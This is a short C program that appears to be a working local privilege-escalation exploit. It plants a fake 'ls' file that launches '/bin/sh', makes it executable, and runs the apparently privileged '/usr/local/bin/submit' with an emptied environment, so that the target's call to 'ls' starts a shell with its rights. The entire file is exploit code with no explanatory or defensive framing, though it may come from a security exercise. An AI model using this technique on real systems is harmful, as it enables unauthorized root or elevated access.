#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define COMMAND "/usr/local/bin/submit"

int main(void) {
  char *args[4], *env[1];
  FILE *f;

  f = fopen("ls", "w");
  fprintf(f, "/bin/sh\n");
  fclose(f);

  chmod("ls", S_IRWXU | S_IRWXG | S_IRWXO);

  args[0] = COMMAND;
  args[1] = "filename";
  args[2] = "message";
  args[3] = NULL;

  env[0] = NULL;

  return execve(COMMAND, args, env);
}
